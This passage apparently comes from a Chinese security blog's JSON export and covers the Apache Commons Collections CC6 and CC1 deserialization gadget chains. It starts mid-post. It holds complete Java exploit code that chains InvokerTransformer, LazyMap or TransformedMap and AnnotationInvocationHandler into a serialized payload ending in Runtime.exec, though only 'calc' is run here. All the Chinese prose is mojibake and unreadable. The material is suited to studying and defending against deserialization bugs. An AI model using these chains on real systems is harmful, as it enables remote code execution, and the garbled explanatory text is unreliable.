é‚£é‡Œå°±ä¼šæ‰§è¡Œ ConstantTransformer.transform è€Œä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ chainedTransformer.transform ï¼Œä¹Ÿå°±æˆåŠŸæ‰“æ–­æ‰§è¡Œäº†ã€‚ è®°å¾— put å®Œä¹‹åå†æ”¹å›æ¥ 1234Class clazz = lazyMap.getClass(); Field factoryField = clazz.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); ä½†æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™åˆä¸å¼¹è®¡ç®—å™¨äº†ï¼Œæˆ‘ä»¬ååºåˆ—åŒ–è·Ÿè¿›è°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°è¿˜æ˜¯å› ä¸º map2 çš„ put ä¹Ÿä¼šèµ°ä¸€éé“¾å­çš„åŸå›  12345if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; èµ°åˆ° Lazy çš„ get çš„æ—¶å€™ï¼Œkey = &quot;aaa&quot;, map å°±æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ª map ï¼Œç¬¬ä¸€æ¬¡è¿›æ¥ map æ²¡æœ‰è¿™ä¸ªè¿™ä¸ªé”®äºæ˜¯å°± put äº†ä¸€ä¸ªã€‚ ç„¶åæˆ‘ä»¬ååºåˆ—åŒ–å†èµ°ä¸€éé“¾å­åˆ°è¿™é‡Œçš„æ—¶å€™å› ä¸ºæ˜¯ç¬¬äºŒæ¬¡æ¥ map.put(key, value); æˆåŠŸåœ°è®© map æœ‰ â€œaaaâ€ è¿™ä¸ªé”®äº†ï¼Œæ‰€ä»¥å°±è¿›ä¸å»è¿™ä¸ª if é‡Œé¢äº†ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ map2 put ä¹‹åæŠŠ map çš„è¿™ä¸ªé”®å€¼å¯¹åˆ æ‰å°±è¡Œäº†ã€‚ å®Œæ•´ä»£ç  12345678910111213141516171819202122232425262728293031public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;); HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry, &quot;bbb&quot;); Class clazz = lazyMap.getClass(); Field factoryField = clazz.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); map.remove(&quot;aaa&quot;);// serialize(map2); unserialize(); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc6.bin&quot;)); oos.writeObject(obj); &#125; public static void unserialize() throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;cc6.bin&quot;)); ois.readObject(); &#125; 0x03 æµç¨‹å›¾ 0x04 æ€è€ƒå¯ä»¥çœ‹åˆ°æ•´ä¸ªè¿‡ç¨‹æ²¡æœ‰å†ç”¨åˆ° AnnotationInvocationHandlerï¼Œæ‰€ä»¥è¿™æ¡é“¾ä¸é™åˆ¶ JDK ç‰ˆæœ¬ï¼Œè€Œä¸”è¿™æ¡é“¾ä¹Ÿä¸ç»•ï¼Œå¤ç°èµ·æ¥ç‰¹åˆ«èˆ’æœã€‚ ç™½ç»„é•¿å¼¹å¹•é‡Œæœ‰ä¸€ä¸ªè¿™ä¸ªé—®é¢˜æŒºæœ‰æ„æ€çš„ æˆ‘åªè¦ååºåˆ—åŒ–æˆåŠŸå°±è¡Œï¼Œé‚£åºåˆ—åŒ–çš„æ—¶å€™å‘½ä»¤æ‰§ä¸æ‰§è¡Œæ— æ‰€è°“æ˜¯ä¸æ˜¯å°±ä¸ç”¨ç®¡äº† è¯„è®ºåŒºæœ‰ä¸ªç­”æ¡ˆæˆ‘è§‰å¾—å¾ˆæœ‰é“ç† å¦‚æœä½ æ˜¯winçš„ä¸»æœºï¼Œä½ åœ¨æ„é€ ä¸€æ¡linuxçš„å‘½ä»¤æ‰§è¡Œé“¾ï¼Œå¦‚æœä½ æ²¡æœ‰è¿›è¡Œè¯¥æ“ä½œï¼Œä½ çš„winæ²¡æœ‰linuxå‘½ä»¤ï¼Œå°±ä¼šå¯¼è‡´é“¾å­æŠ¥é”™ï¼Œè¿›è€Œå¯¼è‡´åºåˆ—åŒ–å¤±è´¥ï¼Œä½ å°±æ— æ³•ç”Ÿæˆå¯¹åº”çš„åºåˆ—åŒ–æ–‡ä»¶ser.binã€‚åœ¨è¿›è¡Œäº†è¯¥æ“ä½œä¹‹åï¼Œæˆ‘ä»¬å°±é¿å…äº†åºåˆ—åŒ–æ“ä½œçš„æŠ¥é”™ï¼Œä¿è¯åºåˆ—åŒ–æ–‡ä»¶çš„æ­£å¸¸ç”Ÿæˆ","tags":["java å®‰å…¨"],"categories":["java å®‰å…¨","ååºåˆ—åŒ–"]},{"title":"CC1 é“¾","path":"/2024/08/04/java/ååºåˆ—åŒ–é“¾/CC é“¾/CC1/","content":"Java ååºåˆ—åŒ–ç¬¬äºŒæ¡é“¾ CC1 ç‰ˆæœ¬ï¼šJDK &lt; 8u71 0x01 æ„ä¹‰è€è§„çŸ©ï¼Œæˆ‘ä»¬å…ˆè®²ä¸ºä»€ä¹ˆè¦å­¦ cc1 é“¾ã€‚CC1 å…¨ç§° Commons Collections 1ï¼ŒApache Commons Collections æ˜¯ä¸€ä¸ªå¹¿æ³›ä½¿ç”¨çš„ Java åº“ï¼Œæä¾›äº†ä¸€ç»„é¢å¤–çš„é›†åˆï¼ˆä¾‹å¦‚ï¼šBagã€MultiMapã€OrderedMap ç­‰ï¼‰ï¼Œè¿™äº›é›†åˆæ‰©å±•äº† Java æ ‡å‡†åº“ä¸­çš„é›†åˆç±»ï¼ˆå¦‚ Listã€Set å’Œ Mapï¼‰çš„åŠŸèƒ½ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜æä¾›äº†å„ç§å®ç”¨å·¥å…·ç±»å’Œæ¥å£æ¥ç®€åŒ–é›†åˆçš„æ“ä½œï¼Œçœ‹åˆ°é›†åˆç±»æˆ‘ä»¬æ˜¯ä¸æ˜¯æƒ³åˆ°äº†ä¸Šä¸€æ¡ URLDNS å‘¢ã€‚ Apache Commons Collections 1ï¼ˆCC1ï¼‰ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨é“¾å¯ä»¥ç”¨äºè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ï¼Œå³åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™ç§æ¼æ´åˆ©ç”¨é€šå¸¸æ¶‰åŠååºåˆ—åŒ–æ¶æ„æ„é€ çš„å¯¹è±¡ï¼Œä»è€Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘ç‰¹å®šç±»çš„æ–¹æ³•ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤çš„æ‰§è¡Œã€‚ å±…ç„¶å¯ä»¥ä»»æ„ä»£ç æ‰§è¡Œï¼Œè¿™å¯å¤ª hacker äº†ï¼ˆå­©æ€•ğŸ˜¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±èƒ½æ€»ç»“å‡ºä¸ºä»€ä¹ˆè¦å­¦ CC1 äº† Commons Collections åº”ç”¨èŒƒå›´å¹¿ï¼ŒçŸ¥åæ¡†æ¶ Struts å°±ç”¨äº†ã€‚ æ¼æ´å±å®³å¤§ï¼Œå¯ä»¥æ‹¿ shell äº†ã€‚ 0x02 åˆ†æç”±äºæ˜¯å€’ç€æ¨é“¾å­ï¼Œæ‰€ä»¥åˆ†æèµ·æ¥ä¼šå¾ˆçƒ§è„‘ï¼ˆä¸ªäººæ„Ÿè§‰ï¼‰ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±ä»¥ä¸æ–­æŠ›å‡ºé—®é¢˜ï¼Œå†è§£å†³é—®é¢˜çš„æ–¹å¼æ¥åˆ†æã€‚ å‘½ä»¤æ‰§è¡Œåœ¨å“ªï¼Ÿä»é“¾å­æœ€åé¢çš„é‚£ä¸ªç±»å¼€å§‹åˆ†æï¼Œæˆ‘ä»¬å‰é¢ä¹Ÿè¯´äº†è¿™æ¡é“¾å­æœ€åå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œé‚£æˆ‘ä»¬é“¾å­æœ€åè‚¯å®šè¦è§¦å‘å‘½ä»¤æ‰§è¡Œå•Šã€‚ InvokerTransformer.transform 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; æˆ‘ä»¬æ³¨æ„åˆ°è¿™ä¸ªç±»é‡Œçš„ transform æ–¹æ³•é‡Œå®ç°äº†åå°„è°ƒç”¨ä»»æ„å‡½æ•°çš„åŠŸèƒ½ï¼Œè¿™ä¸æ­£æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ä»»æ„ä»£ç æ‰§è¡Œçš„å…¥å£å—ï¼ŒOKï¼Œæ¥ç€æ¥çœ‹è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°ï¼Œçœ‹çœ‹æ€ä¹ˆå®ä¾‹åŒ–è¿™ä¸ªç±»å¹¶ä¸”è°ƒå®ƒçš„ transform æ–¹æ³• InvokerTransformer.InvokerTransformer 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; ç»“åˆ transform æ–¹æ³•æˆ‘ä»¬å‘ç°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° methodName æ˜¯è¦è°ƒç”¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•° paramTypes æ˜¯è¿™ä¸ªè¦è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•° args æ˜¯è¦ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨ã€‚ é‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ InvokerTransformer.transform æ¥å®ç°å‘½ä»¤æ‰§è¡Œäº† 12InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;);invokerTransformer.transform(Runtime.getRuntime()); å¦‚ä¸Šè¿°ä»£ç ï¼Œå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚ ä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰é‡å†™ readObject æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—ç»§ç»­æ‰¾å“ªä¸ªç±»è°ƒç”¨äº† transform æ–¹æ³•ã€‚ è°è°ƒç”¨äº† transform æ–¹æ³•TransformedMap.checkSetValue 123protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; è¿™ä¹ˆä¸€ä¸ªæ–¹æ³•è°ƒç”¨äº† transform ï¼Œè€Œä¸” valueTransformerï¼Œå’Œ value æˆ‘ä»¬éƒ½å¯æ§ï¼Œè¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•æ˜¯å—ä¿æŠ¤çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å®ƒçš„é™æ€æ–¹æ³• decorate 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; è¿™ä¸ªè£…é¥°æ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ Mapï¼Œä¸€ä¸ªæ˜¯ keyTransformerï¼Œæœ€åæ˜¯ valueTransformerï¼Œmap æ˜¯æˆ‘ä»¬è¦ä¿®é¥°çš„å¯¹è±¡ï¼ŒkeyTransformer ç”¨ä¸ä¸Šåˆ°æ—¶å€™ä¼  null å°±è¡Œäº†ï¼ŒvalueTransformer åˆ™æ˜¯è°ƒç”¨ transform æ–¹æ³•çš„å¯¹è±¡ï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¦æ§åˆ¶çš„åœ°æ–¹äº† å¯æ˜¯å°±ç®—è¿™æ ·å®ä¾‹åŒ–äº†ï¼Œ checkSetValue æ–¹æ³•ä¹Ÿä¸èƒ½ç›´æ¥è°ƒç”¨ï¼ˆprotectedï¼‰ï¼Œæˆ‘ä»¬å¾—å†æ‰¾ä¸€ä¸‹å“ªä¸ªç±»è°ƒç”¨äº† checkSetValue æ–¹æ³•ã€‚ æˆ‘ä»¬çœ‹ä¸€ä¸‹ AbstractInputCheckedMapDecorator ç±»çš„é™æ€ç±»çš„ MapEntry çš„ setValue æ–¹æ³• 1234public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value);&#125; å¦‚æœè®© parent &#x3D; TransformedMapï¼Œvalue &#x3D; Runtime å²‚ä¸æ˜¯ç¾å“‰ï¼Ÿ çœ‹åˆ° setValue æ˜¯ä¸æ˜¯å°±æƒ³åˆ°äº†å¯¹é›†åˆçš„é‚£å‡ ä¸ªæ“ä½œï¼Œé€šè¿‡Map.Entryæ¥å£ï¼Œå¯ä»¥éå†å’Œæ“ä½œ Map ä¸­çš„é”®å€¼å¯¹ã€‚ æ¯”å¦‚ï¼š 123for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) &#123; System.out.println(&quot;Key: &quot; + entry.getKey() + &quot;, Modified Value: &quot; + entry.getValue()); &#125; é‚£æˆ‘ä»¬å°±å¯ä»¥è¯•ä¸€ä¸‹æ˜¯ä¸æ˜¯çœŸçš„å¯ä»¥èµ°åˆ° AbstractInputCheckedMapDecorator ç±»çš„é™æ€ç±»çš„ MapEntry çš„ setValue æ–¹æ³•é‡Œ 12345678InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;);Map map = new HashMap();Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, invokerTransformer);map.put(&quot;key&quot;, &quot;value&quot;);Runtime runtime = Runtime.getRuntime();for(Map.Entry entry : transformMap.entrySet()) &#123; entry.setValue(runtime);&#125; ç¡®å®å¼¹è®¡ç®—å™¨äº†ï¼Œä½†æ˜¯è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆ entry.setValue ä¼šèµ°åˆ° AbstractInputCheckedMapDecorator é‡Œé¢å»ï¼Ÿæˆ‘ä»¬ç®€å•è°ƒè¯•åˆ†æä¸€ä¸‹ TransformedMap.decorate çš„ä½œç”¨: TransformedMap.decorate æ–¹æ³•é€šå¸¸ä¼šåˆ›å»ºä¸€ä¸ª TransformedMap å®ä¾‹ï¼Œè¿™ä¸ªå®ä¾‹åŒ…è£…äº†ä¼ å…¥çš„ mapï¼Œå¹¶åº”ç”¨äº†æŒ‡å®šçš„è½¬æ¢å™¨ï¼ˆåœ¨ä½ çš„ä¾‹å­ä¸­æ˜¯ invokerTransformerï¼‰ã€‚decorate æ–¹æ³•å¹¶ä¸ä¼šå¤åˆ¶ map çš„å†…å®¹ï¼Œè€Œæ˜¯å°†ä¼ å…¥çš„ map åŒ…è£…åœ¨ä¸€ä¸ªæ–°çš„ TransformedMap å®ä¾‹ä¸­ã€‚ transformMap çš„è¡Œä¸º: å› ä¸º transformMap å®é™…ä¸Šæ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼ˆdecoratorï¼‰ï¼Œå®ƒå¯¹ map è¿›è¡Œäº†è£…é¥°ã€‚è¿™ä¸ªè£…é¥°å™¨ä¸ä¼šå¤åˆ¶ map çš„æ•°æ®ï¼Œè€Œæ˜¯ç›´æ¥æ“ä½œåŸå§‹ mapã€‚å› æ­¤ï¼Œå¯¹ map è¿›è¡Œçš„ä»»ä½•ä¿®æ”¹ï¼Œå¦‚ map.put(&quot;key&quot;, &quot;value&quot;)ï¼Œéƒ½ä¼šåæ˜ åœ¨ transformMap ä¸Šã€‚ æ‰€ä»¥æˆ‘ä»¬è°ƒè¯•çš„æ—¶å€™å‘ç° transformMap çš„å€¼ä¹Ÿæ˜¯ â€œkeyâ€ -&gt; â€œvalueâ€ã€‚ æ­£å¥½æˆ‘ä»¬å‘ç° TransformedMap ç»§æ‰¿äº† AbstractInputCheckedMapDecoratorï¼Œæ‰€ä»¥ transformMap.entrySet() èµ°è¿›äº† AbstractInputCheckedMapDecorator çš„ **entrySet()**ï¼Œåˆå› ä¸º AbstractInputCheckedMapDecorator é‡Œçš„é™æ€ç±» MapEntry é‡å†™äº† setValue æ–¹æ³•ï¼Œæ‰€ä»¥æœ€åçš„ entry.setValue å°±ä¼šèµ°è¿›æ¥ã€‚ MapEntry æ˜¯ AbstractMapEntryDecorator çš„ä¸€ä¸ªå­ç±»ï¼Œä½œä¸ºè£…é¥°å™¨çš„ MapEntry æä¾›äº†ä¸€ç§æ–¹å¼æ¥å¢å¼ºæˆ–æ”¹å˜ Map.Entry çš„è¡Œä¸ºã€‚åœ¨ TransformedMap ä¸­ï¼ŒMapEntry ä¸»è¦è´Ÿè´£ï¼š è°ƒç”¨ checkSetValue() æ–¹æ³•ï¼šåœ¨ setValue() æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒMapEntry ä¼šå…ˆè°ƒç”¨ checkSetValue() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºå¯¹å€¼è¿›è¡Œæ£€æŸ¥æˆ–è½¬æ¢ã€‚checkSetValue() æ–¹æ³•ä¼šè°ƒç”¨ TransformedMap ä¸­çš„ valueTransformer è¿›è¡Œå€¼çš„è½¬æ¢ã€‚ **æ›´æ–°åº•å±‚ Map**ï¼šåœ¨ checkSetValue() æ–¹æ³•å¤„ç†å®Œæˆåï¼Œè½¬æ¢åçš„å€¼ä¼šè¢«ä¼ é€’ç»™åº•å±‚ Map çš„ setValue() æ–¹æ³•ï¼Œä»è€Œæ›´æ–°åº•å±‚ Mapã€‚ å¤§éƒ¨åˆ†éƒ½æ˜¯ gpt çš„è§£é‡Šï¼Œæˆ‘è§‰å¾—å¾—å†å­¦ä¸€ä¸‹ java æ‰èƒ½çœ‹æ‡‚è¿™äº›æ¨¡å—ä½œç”¨ã€‚ å½“ç„¶å•¦è¿˜å¾—ç»§ç»­æ‰¾ï¼Œå› ä¸ºè¿™ä¸ªç±»è¿˜æ²¡æœ‰é‡å†™ readObjectï¼Œé‚£å°±ç»§ç»­æ‰¾è°è°ƒç”¨äº† setValue è°è°ƒç”¨äº† setValue æ–¹æ³•AnnotationInvocationHandler æ¥ä¸‹æ¥è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªéå¸¸å·§åˆçš„äº‹æƒ…ï¼Œä»¥è‡³äºä¸€åº¦æ€€ç–‘æ˜¯å¼€å‘è€…æ•…æ„ç•™çš„åé—¨ é‡å†™äº† readObject æ–¹æ³• é‡å†™çš„ readObject é‡Œç”¨äº† Map.entry æ¥å£éå† éå†çš„ entry é‡Œè°ƒç”¨äº† setValue æ–¹æ³• å®Œç¾è¿ä¸Šäº†ï¼Œç®€ç›´æ˜¯ç¥æ¥ä¹‹ç¬”ã€‚ å…ˆçœ‹ä¸€ä¸‹å®ƒçš„æ„é€ æ–¹æ³• 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues;&#125; ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºä¸€ä¸ª Class å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æè¿°äº†æŸä¸ªå…·ä½“çš„æ³¨è§£ç±»å‹ã€‚æ¢å¥è¯è¯´ï¼Œè¿™ä¸ª Class å¯¹è±¡å¯ä»¥æ˜¯ä»»ä½•å®ç°äº† Annotation æ¥å£çš„ç±»çš„ Class å¯¹è±¡ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ª Mapï¼Œé”®æ˜¯ String ç±»å‹ï¼Œè¡¨ç¤ºæ³¨è§£æˆå‘˜çš„åç§°ã€‚å€¼æ˜¯ Object ç±»å‹ï¼Œè¡¨ç¤ºæ³¨è§£æˆå‘˜å¯¹åº”çš„å€¼ã€‚ å®ä¾‹åŒ– AnnotationInvocationHandlerå®ƒçš„æ„é€ æ–¹æ³•æ²¡æœ‰ä»»ä½•ä¿®é¥°ç¬¦ï¼Œæ„å‘³ç€åªèƒ½åœ¨åŒ…å†…è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡åå°„æ¥æ„é€ å…¶å®ä¾‹åŒ–ã€‚ 1234Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object instance = constructor.newInstance(Override.class, transformMap); ä½†æ˜¯åˆ°è¿™é‡Œå¦‚æœæƒ³è¦åºåˆ—åŒ–ï¼Œæˆ‘ä»¬è¿˜å¾—è€ƒè™‘å‡ ä¸ªé—®é¢˜ å¦‚ä½•è§£å†³ Runtime ä¸å¯åºåˆ—åŒ–ä½ å¯èƒ½ä¼šé—®ï¼Œæˆ‘ä»¬ä¸æ˜¯è¦åºåˆ—åŒ– AnnotationInvocationHandler å—ï¼Œä¸ºä»€ä¹ˆè¦è€ƒè™‘ Runtime æ˜¯å¦å¯åºåˆ—åŒ–ï¼Ÿ åœ¨ Java ä¸­åºåˆ—åŒ–é›†åˆå¯¹è±¡ï¼ˆå¦‚ Mapã€Listã€Set ç­‰ï¼‰æ—¶ï¼Œé›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ ï¼ˆåŒ…æ‹¬é”®å’Œå€¼ï¼‰éƒ½å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚è¿™æ˜¯å› ä¸ºåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒJava ä¼šå°è¯•åºåˆ—åŒ–é›†åˆä¸­åŒ…å«çš„æ¯ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœå…¶ä¸­æœ‰ä»»ä½•å¯¹è±¡ä¸å¯åºåˆ—åŒ–ï¼Œæ•´ä¸ªåºåˆ—åŒ–è¿‡ç¨‹å°±ä¼šå¤±è´¥ï¼Œå¹¶æŠ›å‡º NotSerializableException å¼‚å¸¸ã€‚ æˆ‘ä»¬è‚¯å®šæ˜¯è¦åœ¨ instance é‡Œå®ç°è¿™ä¸€æ®µä»£ç çš„ 1entry.setValue(runtime) æˆ‘ä»¬ä¸‹æ–­ç‚¹å°±èƒ½å‘ç°ï¼ŒmemberValues ä½œä¸º instance çš„ä¸€ä¸ªå±æ€§å·²ç»æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ transformMap ,è€Œä¸”å…¶å€¼æ­£æ˜¯ 1&quot;key&quot; -&gt; &quot;value&quot; æ‰€ä»¥è¯´æ ¹æ®ï¼Œåºåˆ—åŒ–é›†åˆå¯¹è±¡ é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ ï¼ˆåŒ…æ‹¬é”®å’Œå€¼ï¼‰éƒ½å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ è¿™ä¸€æ¡æ€§è´¨ï¼Œæˆ‘ä»¬å°±å¿…é¡»è®© runtime ä¹Ÿå¯åºåˆ—åŒ–ï¼Œæ¯•ç«Ÿåé¢è®¾ç½®äº† key çš„å€¼ä¸º runtime ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚ Runtime è™½ç„¶æ²¡æœ‰ç»§æ‰¿ Serializableï¼Œä½†æ˜¯ Class ç»§æ‰¿äº†ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨åå°„æ¥å®ç° exec æ–¹æ³• 12345Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;); Runtime runtime = (Runtime) getRuntimeMethod.invoke(null); Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class); execMethod.invoke(runtime, &quot;calc.exe&quot;); ç„¶åç”¨ invokerTransformer ç±» æ¥å®ç° 123Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime); è¿™é‡Œå¯ä»¥å‘ç°åœ¨é‡å¤åˆ©ç”¨ transform æ–¹æ³•ï¼Œåˆšå¥½åˆæœ‰è¿™ä¹ˆä¸€ä¸ªç±»çš„ transform æ–¹æ³•å¯ä»¥ç®€å†™æˆ‘ä»¬è¿™æ®µä»£ç ï¼ˆçœŸå°¼ç›çš„å·§ï¼‰ ChainedTransformer çœ‹ä¸€ä¸‹å®ƒçš„æ„é€ å‡½æ•°ï¼Œæ¥å—ä¸€ä¸ª Transformer æ•°ç»„ 1234public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers;&#125; ä»¥åŠ transform å‡½æ•° 123456public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object;&#125; å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªé€’å½’è°ƒç”¨ transform å‡½æ•°ï¼Œä¸Šä¸€ä¸ª i çš„ object ä½œä¸ºä¸‹ä¸€ä¸ª i çš„ transform å‡½æ•°çš„å‚æ•° æˆ‘ä»¬æ•´ç†ä¸€ä¸‹å°±å¯å¾—åˆ° 1234567Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); ä¸å¾—ä¸æ„Ÿæ…¨ä¸€ä¸‹ï¼ŒçœŸæ˜¯å¤ªä¼˜é›…äº†ï¼Œç„¶åæˆ‘ä»¬å†æ•´åˆè¿› AnnotationInvocationHandler é‡Œé¢å» 12345678910111213Transformer[] transformers = new Transformer[]&#123; new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);Map map = new HashMap();Map&lt;Object,Object&gt; transformMap = TransformedMap.decorate(map, null, chainedTransformer);map.put(&quot;key&quot;, &quot;value&quot;);Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object instance = constructor.newInstance(Override.class, transformMap); 